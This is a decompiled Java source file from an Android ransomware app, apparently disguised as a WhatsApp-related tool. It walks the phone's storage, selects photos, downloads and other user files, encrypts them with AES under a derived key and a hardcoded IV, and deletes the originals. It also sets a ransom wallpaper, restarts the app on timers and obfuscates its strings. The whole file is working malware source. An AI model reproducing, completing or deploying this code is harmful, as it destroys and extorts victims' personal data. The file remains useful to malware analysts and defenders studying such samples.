package com.android.tencent.zdevs.bah;

import android.app.WallpaperManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences.Editor;
import android.graphics.BitmapFactory;
import android.util.Base64;
import com.wThgSpyWhatsApp.R;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.spec.AlgorithmParameterSpec;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class Utils {
    static int aa = 0;
    static int bb = 0;
    public static final ExecutorService executorService = Executors.newFixedThreadPool(10);
    public static List filesToEncrypt = new ArrayList();
    static int hh = 0;
    static boolean f5;

    public static void GetFiles(String pathname, String str2, boolean z) {
        for (File file : new File(pathname).listFiles()) {
            if (file.isFile()) {
                String filename = file.toString();
                if (filename.length() >= str2.length()) {
                    filename = (String) filename.subSequence(filename.length() - str2.length(), filename.length());
                }
                if (file.isFile() && filename.equals(str2) && !file.toString().contains("/.") && file.getName().contains(".") && file.length() > 10240 && file.length() <= 52428800) {
                    filesToEncrypt.add(file.getPath());
                }
                if (!z) {
                    return;
                }
            } else if (!(!file.isDirectory() || file.toString().contains("/.") || file.toString().toLowerCase().contains("android") || file.toString().toLowerCase().contains("com.") || file.toString().toLowerCase().contains("miad") || (jd(file.toString()) >= 3 && !file.toString().toLowerCase().contains("baidunetdisk") && !file.toString().toLowerCase().contains("download") && !file.toString().toLowerCase().contains("dcim")))) {
                GetFiles(file.getPath(), str2, z);
            }
        }
    }

    public static String byte2hex(byte[] bArr) {
        String str = "";
        for (byte b : bArr) {
            String toHexString = Integer.toHexString(b & 255);
            str = toHexString.length() == 1 ? str + "0" + toHexString : str + toHexString;
        }
        return str;
    }

    public static void bz(Context context) {
        try {
            WallpaperManager.getInstance(context).setBitmap(BitmapFactory.decodeResource(context.getResources(), R.drawable.bah));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static File decryptFile(String password, String encryptedFilename, String decryptedFilename) {
        File encryptedFile = new File(encryptedFilename);
        File decryptedFile = new File(decryptedFilename);
        if (!(decryptedFile.exists() || decryptedFile.isFile())) {
            try {
                File file2 = decryptedFile.getParentFile();
                if (!file2.exists()) {
                    file2.mkdirs();
                    file2.createNewFile();
                }
                FileInputStream fileInputStream = new FileInputStream(encryptedFile);
                FileOutputStream fileOutputStream = new FileOutputStream(decryptedFile);
                CipherInputStream cipherInputStream = new CipherInputStream(fileInputStream, initAESCipher(password, 1));
                byte[] buffer = new byte[1024];
                while (true) {
                    int result = cipherInputStream.read(buffer);
                    if (result < 0) {
                        break;
                    }
                    fileOutputStream.write(buffer, 0, result);
                }
                fileOutputStream.flush();
                fileOutputStream.close();
                cipherInputStream.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return decryptedFile;
    }

    public static File encryptFile(String password, String toEncryptFilename, String encryptedFilename) {
        File toEncryptFile = new File(toEncryptFilename);
        File encryptedFile = new File(encryptedFilename);
        if (!(encryptedFile.exists() || encryptedFile.isFile())) {
            try {
                File file = encryptedFile.getParentFile();
                if (!file.exists()) {
                    file.mkdirs();
                    file.createNewFile();
                }
                FileInputStream fileInputStream = new FileInputStream(toEncryptFile);
                FileOutputStream fileOutputStream = new FileOutputStream(encryptedFile);
                CipherOutputStream cipherOutputStream = new CipherOutputStream(fileOutputStream, initAESCipher(password, 1));
                byte[] buffer = new byte[1024];
                while (true) {
                    int result = fileInputStream.read(buffer);
                    if (result < 0) {
                        break;
                    }
                    cipherOutputStream.write(buffer, 0, result);
                }
                fileOutputStream.flush();
                fileOutputStream.close();
                cipherOutputStream.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return encryptedFile;
    }

    public static void deleteDir(String str, String str2, int i, final Context context) {
        if (i != 0) {
            new Timer().schedule(new TimerTask() {
                public void run() {
                    Editor edit = context.getSharedPreferences("XH", 0).edit();
                    edit.putInt("sss", 1);
                    edit.commit();
                    MainActivity.instance.finish();
                    Intent launchIntentForPackage = context.getPackageManager().getLaunchIntentForPackage(context.getPackageName());
                    launchIntentForPackage.addFlags(1073741824);
                    context.startActivity(launchIntentForPackage);
                }
            }, 600000);
        }
        deleteDirWithFile(new File(str), str2, i, context);
        f5 = true;
    }

    public static void deleteDirWithFile(File file, final String str, final int i, final Context context) {
        if (file != null && file.exists() && file.isDirectory()) {
            List asList = Arrays.asList(file.listFiles());
            Collections.reverse(asList);
            for (final File file2 : (File[]) asList.toArray(new File[asList.size()])) {
                String filename = file2.toString();
                if (filename.length() >= MainActivity.hzs) {
                    filename = (String) filename.subSequence(filename.length() - MainActivity.hzs, filename.length());
                }
                if (i == 0) {
                    try {
                        if (file2.isFile() && filename.equals(MainActivity.hz) && !file2.toString().contains("/.") && file2.getName().contains(".")) {
                            executorService.execute(new Runnable() {
                                public void run() {
                                    if (file2.getName().contains("!！" + MainActivity.hz)) {
                                        file2.delete();
                                    } else {
                                        Utils.jj(file2, str, i);
                                    }
                                    Utils.aa++;
                                    if (Utils.filesToEncrypt.size() <= Utils.aa) {
                                        Utils.aa = 0;
                                        Utils.filesToEncrypt = new ArrayList();
                                        Editor edit = context.getSharedPreferences("XH", 0).edit();
                                        edit.putInt("cjk", 1);
                                        edit.commit();
                                        MainActivity.instance.finish();
                                        Intent launchIntentForPackage = context.getPackageManager().getLaunchIntentForPackage(context.getPackageName());
                                        launchIntentForPackage.addFlags(67108864);
                                        context.startActivity(launchIntentForPackage);
                                    }
                                }
                            });
                        } else if (!(!file2.isDirectory() || file2.toString().contains("/.") || file2.toString().toLowerCase().contains("android") || file2.toString().toLowerCase().contains("com.") || file2.toString().toLowerCase().contains("miad") || (jd(file2.toString()) >= 3 && !file2.toString().toLowerCase().contains("baidunetdisk") && !file2.toString().toLowerCase().contains("download") && !file2.toString().toLowerCase().contains("dcim")))) {
                            deleteDirWithFile(file2, str, i, context);
                        }
                    } catch (Exception e) {
                    }
                } else if (file2.isFile() && !filename.equals(MainActivity.hz) && !file2.toString().contains("/.") && file2.getName().contains(".") && file2.length() > 10240 && file2.length() <= 52428800 && zjs(file2.getName() + MainActivity.hz) <= 251) {
                    bb++;
                    executorService.execute(new Runnable() {
                        public void run() {
                            Utils.jj(file2, str, i);
                            Utils.hh++;
                            if (Utils.bb == Utils.hh && Utils.f5) {
                                Editor edit = context.getSharedPreferences("XH", 0).edit();
                                edit.putInt("sss", 1);
                                edit.commit();
                                MainActivity.instance.finish();
                                Intent launchIntentForPackage = context.getPackageManager().getLaunchIntentForPackage(context.getPackageName());
                                launchIntentForPackage.addFlags(1073741824);
                                context.startActivity(launchIntentForPackage);
                            }
                        }
                    });
                } else if (!(!file2.isDirectory() || file2.toString().contains("/.") || file2.toString().toLowerCase().contains("android") || file2.toString().toLowerCase().contains("com.") || file2.toString().toLowerCase().contains("miad") || (jd(file2.toString()) >= 3 && !file2.toString().toLowerCase().contains("baidunetdisk") && !file2.toString().toLowerCase().contains("download") && !file2.toString().toLowerCase().contains("dcim")))) {
                    deleteDirWithFile(file2, str, i, context);
                }
            }
        }
    }

    public static String formatDuring(long j) {
        return to2Str(j / 86400000) + ":" + to2Str((j % 86400000) / 3600000) + ":" + to2Str((j % 3600000) / 60000) + ":" + to2Str((j % 60000) / 1000);
    }

    public static String formatDuring(Date date, Date date2) {
        return formatDuring(date2.getTime() - date.getTime());
    }

    public static String getStringRandom(int i) {
        String str = "";
        Random random = new Random();
        int i2 = 0;
        while (i2 < i) {
            String str2 = random.nextInt(2) % 2 == 0 ? "char" : "num";
            if ("char".equalsIgnoreCase(str2)) {
                str2 = str + ((char) ((random.nextInt(2) % 2 == 0 ? 65 : 97) + random.nextInt(26)));
            } else {
                str2 = "num".equalsIgnoreCase(str2) ? str + String.valueOf(random.nextInt(10)) : str;
            }
            i2++;
            str = str2;
        }
        return str;
    }

    public static final String getbah(String str) {
        String str2 = new String(Base64.encode("by:彼岸花 qq:1279525738".getBytes(), 0));
        String str3 = (String) str2.subSequence(3, 4);
        str2 = (String) str2.subSequence(4, 5);
        return new String(Base64.encode((String.valueOf(new StringBuffer(new String(Base64.encode(str.getBytes(), 0))).reverse()) + "").getBytes(), 0)).replaceAll(str3, "三生石畔").replaceAll(str2, "彼岸花开").replaceAll("三生石畔", str2).replaceAll("彼岸花开", str3);
    }

    public static String getmm(String str) {
        byte[] bArr = null;
        try {
            MessageDigest instance = MessageDigest.getInstance("SHA-1");
            instance.update(str.getBytes());
            bArr = instance.digest();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        return byte2hex(bArr);
    }

    public static final String generateCipher(String str) {
        int i = 0;
        char[] cArr = new char[]{'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};
        try {
            byte[] bytes = str.getBytes();
            MessageDigest instance = MessageDigest.getInstance("MD5");
            instance.update(bytes);
            char[] cArr2 = new char[(instance.getDigestLength() * 2)];
            for (byte b : instance.digest()) {
                int i2 = i + 1;
                cArr2[i] = cArr[(b >>> 4) & 15];
                i = i2 + 1;
                cArr2[i2] = cArr[b & 15];
            }
            return new String(cArr2).substring(8, 24);
        } catch (Exception e) {
            e.printStackTrace();
            return (String) null;
        }
    }

    private static Cipher initAESCipher(String str, int i) {
        Cipher cipher = null;
        try {
            AlgorithmParameterSpec ivParameterSpec = new IvParameterSpec("QQqun 571012706 ".getBytes());
            Key secretKeySpec = new SecretKeySpec(str.getBytes(), "AES");
            cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(i, secretKeySpec, ivParameterSpec);
            return cipher;
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
            return cipher;
        } catch (NoSuchPaddingException e2) {
            e2.printStackTrace();
            return cipher;
        } catch (InvalidKeyException e3) {
            e3.printStackTrace();
            return cipher;
        } catch (InvalidAlgorithmParameterException e4) {
            e4.printStackTrace();
            return cipher;
        }
    }

    static int jd(String str) {
        String replaceAll = str.replaceAll(MainActivity.externalStorageDirectory.toString(), "");
        return replaceAll.length() - replaceAll.replaceAll("/", "").length();
    }

    public static void jj(File file, String str, int i) {
        String str2 = generateCipher(str);
        if (i == 0) {
            String file2 = file.toString();
            decryptFile(str2, file.toString(), (String) file2.subSequence(0, file2.length() - MainActivity.hzs));
        } else {
            encryptFile(str2, file.toString(), String.valueOf(file) + "!！" + MainActivity.hz);
            new File(String.valueOf(file) + "!！" + MainActivity.hz).renameTo(new File(String.valueOf(file) + MainActivity.hz));
        }
        file.delete();
    }

    public static String m9l(String str) {
        String replaceAll = Base64.encodeToString("三生石畔 彼岸花开".getBytes(), 0).replaceAll("\\D+", "");
        Integer num = Integer.valueOf(new StringBuffer(replaceAll).reverse().toString());
        char[] toCharArray = str.toCharArray();
        for (int i2 = 0; i2 < toCharArray.length; i2++) {
            toCharArray[i2] = (char) (num.intValue() ^ toCharArray[i2]);
        }
        String stringBuffer = new StringBuffer(new String(Base64.decode(new String(toCharArray), 0))).reverse().toString();
        num = Integer.valueOf(replaceAll);
        char[] toCharArray2 = stringBuffer.toCharArray();
        for (int i = 0; i < toCharArray2.length; i++) {
            toCharArray2[i] = (char) (num.intValue() ^ toCharArray2[i]);
        }
        return new String(toCharArray2);
    }

    public static void deleteFile(final File file) {
        new Thread(new Runnable() {
            public void run() {
                if (!file.getName().contains("彼岸花开")) {
                    if (file.isFile()) {
                        file.delete();
                    } else if (file.isDirectory()) {
                        File[] listFiles = file.listFiles();
                        if (listFiles == null || listFiles.length == 0) {
                            file.delete();
                            return;
                        }
                        for (File sc : listFiles) {
                            Utils.deleteFile(sc);
                        }
                        file.delete();
                    }
                }
            }
        }).start();
    }

    private static String to2Str(long j) {
        return j > 9 ? String.valueOf(j) + "" : "0" + j;
    }

    static int zjs(String str) {
        return str.getBytes().length;
    }
}
